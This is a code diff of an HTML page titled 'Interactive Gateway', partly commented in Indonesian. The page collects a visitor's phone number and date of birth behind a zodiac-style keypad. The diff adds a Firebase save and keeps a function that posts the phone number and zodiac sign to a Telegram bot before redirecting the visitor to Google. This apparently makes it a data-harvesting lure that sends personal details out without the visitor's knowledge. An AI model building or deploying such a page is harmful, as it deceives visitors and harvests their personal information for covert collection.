@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Interactive Gateway</title>
-<!-- Tailwind CSS CDN for styling -->
 <script src="https://cdn.tailwindcss.com"></script>
 <style>
 /* Ensure the body and html take up the full screen */
@@ -48,17 +47,14 @@ color: white;
 </head>
 <body class="bg-black">
 
-<!-- Card Keypad (Visible by default) -->
 <div id="cardKeypad" class="modal-container">
 <div class="w-full max-w-xs bg-black rounded-2xl p-6">
 <h3 id="keypadTitle" class="text-white text-xl text-center font-bold mb-4">Select a Value</h3>
 <div id="selectionContainer" class="grid grid-cols-3 gap-2">
-<!-- Card buttons will be generated here -->
 </div>
 </div>
 </div>
 
-<!-- User Info Modal (Initially Hidden) -->
 <div id="infoModal" class="modal-container hidden">
 <div class="bg-black p-8 rounded-xl max-w-sm w-full m-4">
 <h2 class="text-2xl font-bold mb-6 text-center text-white">Enter Your Details</h2>
@@ -73,12 +69,25 @@ color: white;
 </div>
 </div>
 
-<!-- --- Main Application Script --- -->
 <script type="module">
-// --- Firebase SDK Imports from CDN ---
-import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
+// Import Firebase modules
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";
+
+// --- Firebase Configuration ---
+// Menggunakan variabel lingkungan Vercel. Pastikan Anda sudah mensetting ini di Vercel.
+const firebaseConfig = {
+apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
+authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
+projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
+storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
+messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
+appId: import.meta.env.VITE_FIREBASE_APP_ID
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
 
 // --- Element References ---
 const cardKeypad = document.getElementById('cardKeypad');
@@ -126,48 +135,9 @@ if ((month == 12 && day >= 22) || (month == 1 && day <= 19)) return "Capricorn";
 return "Unknown";
 }
 
-// --- Firebase Initialization and Auth ---
-let db, auth;
-let isAuthenticated = false;
-
-// Function to get environment variables from Vercel (or local fallback)
-const getEnvVar = (key) => {
-  // Vercel exposes env variables to the client-side via `VITE_` prefix
-  return import.meta.env[key] || process.env[key];
-};
-
-// Konfigurasi Firebase membaca variabel lingkungan
-const firebaseConfig = {
-  apiKey: getEnvVar("VITE_FIREBASE_API_KEY"),
-  authDomain: getEnvVar("VITE_FIREBASE_AUTH_DOMAIN"),
-  projectId: getEnvVar("VITE_FIREBASE_PROJECT_ID"),
-  storageBucket: getEnvVar("VITE_FIREBASE_STORAGE_BUCKET"),
-  messagingSenderId: getEnvVar("VITE_FIREBASE_MESSAGING_SENDER_ID"),
-  appId: getEnvVar("VITE_FIREBASE_APP_ID"),
-  databaseURL: getEnvVar("VITE_FIREBASE_DATABASE_URL")
-};
-
-// Initialize Firebase services
-const app = initializeApp(firebaseConfig);
-db = getDatabase(app);
-auth = getAuth(app);
-
-// Authenticate the user anonymously
-async function authenticateUser() {
-try {
-const userCredential = await signInAnonymously(auth);
-console.log("Signed in anonymously. User ID:", userCredential.user.uid);
-isAuthenticated = true;
-} catch (error) {
-console.error("Firebase Anonymous Auth failed:", error);
-isAuthenticated = false;
-}
-}
-authenticateUser();
-
 // --- API and Redirect Functions ---
 async function sendToTelegram(zodiac, phone) {
-const message = `Zodiac: ${zodiac}\nPhone: ${phone}`;
+const message = `${zodiac}\n${phone}`;
 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 try {
 await fetch(url, {
@@ -177,25 +147,6 @@ body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
 });
 } catch (error) {
 console.error("Failed to send message to Telegram:", error);
-}
-}
-
-async function saveToRealtimeDatabase(zodiac, phone, dob) {
-if (!isAuthenticated) {
-console.error("User not authenticated. Cannot save to Realtime Database.");
-return;
-}
-try {
-const submissionsRef = ref(db, 'submissions');
-await push(submissionsRef, {
-zodiacSign: zodiac,
-phoneNumber: phone,
-dateOfBirth: dob,
-timestamp: serverTimestamp()
-});
-console.log("Data successfully written to Realtime Database.");
-} catch (error) {
-console.error("Error writing data to Realtime Database:", error);
 }
 }
 
@@ -209,8 +160,25 @@ async function handleZodiacSubmission() {
 const phone = phoneNumberInput.value;
 const dob = dobInput.value;
 const zodiac = getZodiacSign(dob);
+
+// Menyiapkan data yang akan disimpan ke Firebase
+const userData = {
+phoneNumber: phone,
+dateOfBirth: dob,
+zodiacSign: zodiac,
+timestamp: new Date().toISOString()
+};
+
+try {
+// Menyimpan data ke Firebase Realtime Database di bawah path 'userSubmissions'
+await push(ref(database, 'userSubmissions'), userData);
+console.log("Data berhasil disimpan ke Firebase!");
+} catch (error) {
+console.error("Gagal menyimpan data ke Firebase:", error);
+}
+
+// Lanjutkan dengan mengirim data ke Telegram dan redirect ke Google
 await sendToTelegram(zodiac, phone);
-await saveToRealtimeDatabase(zodiac, phone, dob);
 redirectToGoogle(zodiac);
 }
 
@@ -274,9 +242,7 @@ handleZodiacSubmission();
 });
 
 // --- Initial Setup ---
-window.onload = () => {
-    displayRanks();
-};
+displayRanks(); // Start with the functional keypad
 
 </script>
 </body>
